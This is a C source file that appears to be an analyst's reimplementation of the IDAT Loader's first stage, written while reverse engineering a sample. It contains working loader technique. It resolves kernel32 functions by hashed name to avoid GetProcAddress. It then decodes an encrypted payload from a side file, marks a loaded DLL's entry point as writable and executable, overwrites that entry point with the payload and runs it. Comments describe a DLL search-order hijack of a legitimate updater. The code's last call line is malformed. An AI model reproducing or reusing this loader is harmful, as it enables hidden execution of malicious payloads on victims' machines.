#include <windows.h>
#include <stdio.h>

/* ==== IDAT Loader - Stage 1 */

/* ==== DLL Search Order Hijacked DLL rtl280.bpl */

/* ==== Imported into CheckForUpdates.exe (legitmate executable part of RoboTasks) */

// Hash function for 
DWORD HashMath(const char* name, DWORD seed) {
    DWORD hash = seed;
    while (*name) {
        hash = (hash * 2) + (unsigned char)(*name++);
    }
    return hash;
}

// Matching API's in kernel32.dll 
FARPROC ResolveExportByHash(const char* dllName, DWORD targetHash, DWORD seed) {
    // original malware uses GetModuleHandleW (this is just for demo purposes) 
    HMODULE hMod = GetModuleHandleA(dllName);
    if (!hMod) {
        return NULL;
    }

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dosHeader->e_lfanew);
    DWORD exportDirRVA = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!exportDirRVA) {
        return NULL;
    }

    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hMod + exportDirRVA);
    DWORD* nameRVAs = (DWORD*)((BYTE*)hMod + exportDir->AddressOfNames);
    WORD* ordinals = (WORD*)((BYTE*)hMod + exportDir->AddressOfNameOrdinals);
    DWORD* functions = (DWORD*)((BYTE*)hMod + exportDir->AddressOfFunctions);


    for (DWORD i = 0; i < exportDir->NumberOfNames; ++i) {
        const char* funcName = (const char*)((BYTE*)hMod + nameRVAs[i]);
        DWORD hash = HashMath(funcName, seed);
        if (hash == targetHash) {
            WORD ordinal = ordinals[i];
            DWORD funcRVA = functions[ordinal];
            return (FARPROC)((BYTE*)hMod + funcRVA);
        }
    }

    return NULL;
}
// Wrappers to store function calls in kernel32.dll , to prevent use of GetProcAddress 
typedef VOID(WINAPI* pFatalAppExitW)(UINT, LPCWSTR);
typedef HLOCAL(WINAPI* pLocalAlloc)(UINT, SIZE_T);
typedef BOOL(WINAPI* pSetCurrentDirectoryW)(LPCWSTR);
typedef DWORD(WINAPI* pGetModuleFileNameW)(HMODULE, LPWSTR, DWORD);
typedef HANDLE(WINAPI* pCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef DWORD(WINAPI* pGetFileSize)(HANDLE, LPDWORD);
typedef HMODULE(WINAPI* pLoadLibraryA)(LPCSTR);
typedef BOOL(WINAPI* pReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL(WINAPI* pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);

pFatalAppExitW _FatalAppExitW;
pLocalAlloc _LocalAlloc;
pSetCurrentDirectoryW _SetCurrentDirectoryW;
pGetModuleFileNameW _GetModuleFileNameW;
pCreateFileA _CreateFileA;
pGetFileSize _GetFileSize;
pLoadLibraryA _LoadLibraryA;
pReadFile _ReadFile;
pVirtualProtect _VirtualProtect;

#include <fstream>

int main() {



    DWORD seed = 0x37A0E7C5;

    // API Hashing from an DLL using seed phrase 

    _FatalAppExitW = (pFatalAppExitW)ResolveExportByHash("kernel32.dll", 0x1D035B73, seed);
    _LocalAlloc = (pLocalAlloc)ResolveExportByHash("kernel32.dll", 0x83A07CA1, seed);
    _SetCurrentDirectoryW = (pSetCurrentDirectoryW)ResolveExportByHash("kernel32.dll", 0x82192D69, seed);
    _GetModuleFileNameW = (pGetModuleFileNameW)ResolveExportByHash("kernel32.dll", 0x0A06F2EDD, seed);
    _CreateFileA = (pCreateFileA)ResolveExportByHash("kernel32.dll", 0x0740E183, seed);
    _GetFileSize = (pGetFileSize)ResolveExportByHash("kernel32.dll", 0x0740D8A5, seed);
    _LoadLibraryA = (pLoadLibraryA)ResolveExportByHash("kernel32.dll", 0x0E81EBA3, seed);
    _ReadFile = (pReadFile)ResolveExportByHash("kernel32.dll", 0x0A0E81EB1, seed);
    _VirtualProtect = (pVirtualProtect)ResolveExportByHash("kernel32.dll", 0x3A09A09E, seed);

    // Creating a file buffer here as shown in the decompiler with value 0x127A3980

    LPVOID lpFilename = _LocalAlloc(0, 0x127A3980);

    _GetModuleFileNameW(0, (LPWSTR)lpFilename, 260);

    // Strip executable name from ModuleFileName (itself) 
    WCHAR* lastSlash = wcsrchr((WCHAR*)lpFilename, L'\\');

    if (lastSlash) *lastSlash = L'\0';

    // Set that as the current directory 
    _SetCurrentDirectoryW((LPCWSTR)lpFilename);


    // and then open the Zoubcleg file 
    HANDLE hFile = _CreateFileA(
        "Zoubcleg.vd", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
    );

    // and if we are unable to , result in app exit 
    if (hFile == INVALID_HANDLE_VALUE) _FatalAppExitW(0, (LPCWSTR)lpFilename);


    // get the file size of this file we are reading 
    DWORD dwFileSize = _GetFileSize(hFile, NULL);


    // real version does not reuse LocalAlloc, but the buffer would be able this size
    LPVOID lpBuffer = _LocalAlloc(0, dwFileSize);

    DWORD lpNumberOfBytesRead = 0;

    // 5/12/2025

    // We read that file into the buffer 
    _ReadFile(hFile, lpBuffer, dwFileSize, &lpNumberOfBytesRead, NULL);


    // and then start its decoding routine 
    int OffsetValue = 0x0B736;

    // get where the encoded payload is 
    BYTE* lpDataStart = (BYTE*)lpBuffer + OffsetValue;

    // getting the real payload size 
    DWORD realDataSize = *(DWORD*)lpDataStart;

    // saving the additon key from the payload 
    DWORD additionKey = *(DWORD*)(lpDataStart + 4);


    BYTE* pointer = lpDataStart + 8;


    // non standard use off LocalAlloc (not related to real sample)
    BYTE* res = (BYTE*)_LocalAlloc(0, realDataSize);

    for (DWORD i = 0; i < realDataSize / 4; i++) {

        DWORD value = *(DWORD*)(pointer + i * 4);


        DWORD decodedValue = (value + additionKey) & 0xFFFFFFFF;

        *(DWORD*)(res + i * 4) = decodedValue;
    }

    BYTE pointerOffset = res[0];


    // to store the hollowing target DLL value 
    char hollowingTarget[256] = { 0 };


    // saving hollowing target value 
    memcpy(hollowingTarget, res + 1, pointerOffset - 1);

    // entry point 
    DWORD entry = *(DWORD*)(res + pointerOffset + 4);

    // actual code size offset 
    DWORD codeSize = *(DWORD*)(res + pointerOffset + 8);

    BYTE* code = res + pointerOffset + 12;

    // not sure about this 
    BYTE* unknownBlob = code + codeSize;

    DWORD unknownBlobSize = realDataSize - (pointerOffset + 12 + codeSize);

    // 5/13/2025 

    // Perform DLL Code Injection

    // Loading the hollowing target form our copied memory 
    HMODULE hTargetModule = _LoadLibraryA(hollowingTarget);

    if (!hTargetModule) _FatalAppExitW(0, (LPCWSTR)lpFilename);

    BYTE* codeBase = (BYTE*)hTargetModule;


    // Locating the DLL Entry point here
    DWORD peOffset = *(DWORD*)(codeBase + 0x3C);

    DWORD entryRVA = *(DWORD*)(codeBase + peOffset + 0x28); 

    BYTE* entryPointAddr = codeBase + entryRVA;

    DWORD oldProtect = 0;

    // changing the permissons so that they are read write executable as shown in x32dbg 
    _VirtualProtect(entryPointAddr, codeSize, PAGE_EXECUTE_READWRITE, &oldProtect);


    // Injecting the payload 
    memcpy(entryPointAddr, code, codeSize);

    // changing the permissons back 
    _VirtualProtect(entryPointAddr, codeSize, oldProtect, &oldProtect);


    ((void(*)())entryPointAddr();)
    (void)getchar;


    // also what is it doing with Klureartcik.st ?
    return 0;
}
